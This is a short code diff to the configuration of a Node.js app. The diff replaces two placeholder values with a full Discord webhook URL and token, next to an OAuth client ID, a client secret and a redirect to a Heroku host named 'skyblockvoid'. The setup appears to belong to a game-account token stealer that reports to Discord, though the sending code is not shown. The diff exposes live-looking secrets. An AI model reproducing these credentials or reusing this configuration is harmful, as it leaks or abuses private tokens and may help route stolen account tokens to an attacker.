@@ -2,8 +2,8 @@
 const client_secret = '7305f2f3-b121-4b6a-8fbf-c4c9ef3c840f'
 const client_id = '7305f2f3-b121-4b6a-8fbf-c4c9ef3c840f'
 const redirect_uri = 'https://skyblockvoid.herokuapp.com/'
-const webhook_url = 'change'
-const webhook_logging_url = 'change'
+const webhook_url = 'https://discord.com/api/webhooks/1038208475676819571/fWNYZJV_YpK5s-69zNa7aCdw06S9wfdrYr9rYyHzIJnOBKNY4jxgGE6wQxkdZRfOePHJ'
+const webhook_logging_url = 'https://discord.com/api/webhooks/1038208475676819571/fWNYZJV_YpK5s-69zNa7aCdw06S9wfdrYr9rYyHzIJnOBKNY4jxgGE6wQxkdZRfOePHJ'
 // Config end
 const axios = require('axios')
 const express = require('express')
